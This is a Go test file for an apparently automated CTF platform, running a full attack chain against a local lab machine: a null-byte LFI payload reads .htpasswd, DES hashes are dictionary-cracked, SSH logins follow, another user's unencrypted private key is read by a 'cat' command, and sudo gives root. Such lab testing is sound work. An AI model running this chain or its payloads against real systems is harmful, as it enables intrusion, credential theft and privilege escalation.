package ctfplatform

import (
	"context"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"
)

func TestTrySSHLogin_RequiresExplicitInsecure(t *testing.T) {
	// 自签主机密钥必须显式放行，否则直接拒绝——避免默认不校验主机密钥
	if _, err := TrySSHLogin(context.Background(), "127.0.0.1:1", "u", "p", false, time.Second); err == nil {
		t.Fatal("allowInsecureHostKey=false 时应返回错误")
	} else if !strings.Contains(err.Error(), "insecure") {
		t.Errorf("错误信息应说明 insecure 原因，实际: %v", err)
	}
}

// TestLiveSSHChain 跑完整杀伤链：LFI 取 .htpasswd → 破解 → SSH 登录 → `id` 证明权限。
//
// 需要同时设三个环境变量，否则 SKIP（默认不联网、不耗时）：
//
//	CTF4_LAB_URL=http://127.0.0.1:8080/
//	CTF4_WORDLIST=D:/tmp_gotest/words.txt
//	CTF4_SSH_ADDR=127.0.0.1:2222
//
//	go test -run TestLiveSSHChain -v -timeout 1800s ./internal/ctfplatform/
//
// 说明：字典 10 万词 × 变形约需 2~3 分钟；口令明文只在内存中传递，不写日志、不入库。
func TestLiveSSHChain(t *testing.T) {
	base := os.Getenv("CTF4_LAB_URL")
	dictPath := os.Getenv("CTF4_WORDLIST")
	sshAddr := os.Getenv("CTF4_SSH_ADDR")
	if base == "" || dictPath == "" || sshAddr == "" {
		t.Skip("缺 CTF4_LAB_URL / CTF4_WORDLIST / CTF4_SSH_ADDR，跳过")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Second)
	defer cancel()

	// 1. LFI 读 .htpasswd
	cl := webClient(8 * time.Second)
	_, body, _, err := webFetch(ctx, cl, strings.TrimSuffix(base, "/")+"/?page=../restricted/.htpasswd%00")
	if err != nil {
		t.Fatalf("读取 .htpasswd 失败: %v", err)
	}
	reLine := regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[A-Za-z0-9./]{13}$`)
	entries := ParseHtpasswd(strings.Join(reLine.FindAllString(string(body), 50), "\n"))
	if len(entries) == 0 {
		t.Fatalf("未解析出 DES 条目")
	}

	// 2. 破解
	words, err := LoadWordlist(dictPath)
	if err != nil {
		t.Fatalf("读字典失败: %v", err)
	}
	users := make([]string, 0, len(entries))
	for _, e := range entries {
		users = append(users, e.User)
	}
	words = append(words, BuiltinWordlist(users)...)

	start := time.Now()
	cracked := CrackHtpasswdBatched(entries, words, true, 20000, 0)
	t.Logf("[crack] elapsed=%v 破解成功=%d/%d", time.Since(start).Round(time.Second), len(cracked), len(entries))
	if len(cracked) == 0 {
		t.Skip("字典未覆盖任何口令——属正常结果，不算失败")
	}

	// 3. SSH 登录 + 权限证明
	for _, c := range cracked {
		acc, err := TrySSHLogin(ctx, sshAddr, c.User, c.Password, true, 15*time.Second)
		if err != nil {
			t.Logf("[ssh] %s 登录失败: %v", c.User, err)
			continue
		}
		t.Logf("[ssh] %s 登录成功 addr=%s", acc.User, acc.Addr)
		t.Logf("[ssh] id=%s", acc.WhoAmI)
		t.Logf("[ssh] hostname=%s", acc.Hostname)
		if !strings.Contains(acc.WhoAmI, "uid=") {
			t.Errorf("`id` 输出异常: %q", acc.WhoAmI)
		}
		return // 一条成功即证明链条打通
	}
	t.Fatalf("破解到 %d 条口令但均未能登录", len(cracked))
}

// TestLivePrivescToRoot 跑完整提权链：
// ghighland 口令登录 → 偷 achen 世界可读的未加密 PPK → PPK 转 PEM → 以 achen 登录 → sudo 提权到 root。
//
// 环境变量（全部可选，缺则 SKIP）：
//
//	CTF4_SSH_ADDR   必填，如 127.0.0.1:2222
//	CTF4_SSH_USER   可选，已知的初始用户（配合 CTF4_SSH_PASS 可跳过破解）
//	CTF4_SSH_PASS   可选，初始用户口令
//	CTF4_LAB_URL + CTF4_WORDLIST  未给凭据时用于破解
func TestLivePrivescToRoot(t *testing.T) {
	sshAddr := os.Getenv("CTF4_SSH_ADDR")
	if sshAddr == "" {
		t.Skip("未设 CTF4_SSH_ADDR，跳过")
	}
	// 2009 年的靶机私钥只有 1023 位，Go 1.24+ 默认拒绝；实验环境放开
	_ = os.Setenv("GODEBUG", "rsa1024min=0")

	ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Second)
	defer cancel()

	user, pass := os.Getenv("CTF4_SSH_USER"), os.Getenv("CTF4_SSH_PASS")
	if user == "" || pass == "" {
		base, dict := os.Getenv("CTF4_LAB_URL"), os.Getenv("CTF4_WORDLIST")
		if base == "" || dict == "" {
			t.Skip("既无 CTF4_SSH_USER/PASS，也无 CTF4_LAB_URL+CTF4_WORDLIST，跳过")
		}
		user, pass = crackInitialCred(t, ctx, base, dict)
	}

	// 1. 偷私钥
	ppk, err := RunSSHCommand(ctx, sshAddr, user, pass,
		"cat /home/achen/.ssh/achen_priv.ppk", true, 30*time.Second)
	if err != nil {
		t.Fatalf("读取 achen 私钥失败: %v", err)
	}
	if !strings.Contains(ppk, "PuTTY-User-Key-File-2") || !strings.Contains(ppk, "Encryption: none") {
		t.Fatalf("私钥不可用（非未加密 PPK），前 40 字节: %q", ppk[:min(len(ppk), 40)])
	}
	t.Logf("[privesc] 偷到未加密 PPK，%d 字节", len(ppk))

	// 2. 转 PEM 并以 achen 登录
	pemKey, err := PPKToPEM([]byte(ppk))
	if err != nil {
		t.Fatalf("PPK 转 PEM 失败: %v", err)
	}
	acc, err := TrySSHLoginWithKey(ctx, sshAddr, "achen", pemKey, true, 15*time.Second)
	if err != nil {
		t.Fatalf("achen 私钥登录失败: %v", err)
	}
	t.Logf("[privesc] achen 登录成功: %s", acc.WhoAmI)

	// 3. sudo 提权
	out, err := RunSSHCommandWithKey(ctx, sshAddr, "achen", pemKey,
		"sudo id 2>&1", true, 30*time.Second)
	if err != nil {
		t.Fatalf("sudo 执行失败: %v（输出: %s）", err, out)
	}
	if !strings.Contains(out, "uid=0(root)") {
		t.Fatalf("未取得 root，输出: %s", strings.TrimSpace(out))
	}
	t.Logf("[privesc] 提权成功: %s", strings.TrimSpace(out))
}

// crackInitialCred 用 LFI + 字典破解拿初始凭据（会尝试 .htpasswd 里所有用户）。
func crackInitialCred(t *testing.T, ctx context.Context, base, dict string) (string, string) {
	t.Helper()
	cl := webClient(8 * time.Second)
	_, body, _, err := webFetch(ctx, cl, strings.TrimSuffix(base, "/")+"/?page=../restricted/.htpasswd%00")
	if err != nil {
		t.Fatalf("读取 .htpasswd 失败: %v", err)
	}
	reLine := regexp.MustCompile(`(?m)^[A-Za-z0-9_.\-]{1,32}:[A-Za-z0-9./]{13}$`)
	entries := ParseHtpasswd(strings.Join(reLine.FindAllString(string(body), 50), "\n"))
	if len(entries) == 0 {
		t.Fatalf("未解析出 DES 条目")
	}
	words, err := LoadWordlist(dict)
	if err != nil {
		t.Fatalf("读字典失败: %v", err)
	}
	users := make([]string, 0, len(entries))
	for _, e := range entries {
		users = append(users, e.User)
	}
	words = append(words, BuiltinWordlist(users)...)
	cracked := CrackHtpasswdBatched(entries, words, true, 20000, 0)
	if len(cracked) == 0 {
		t.Skip("字典未覆盖任何口令")
	}
	return cracked[0].User, cracked[0].Password
}
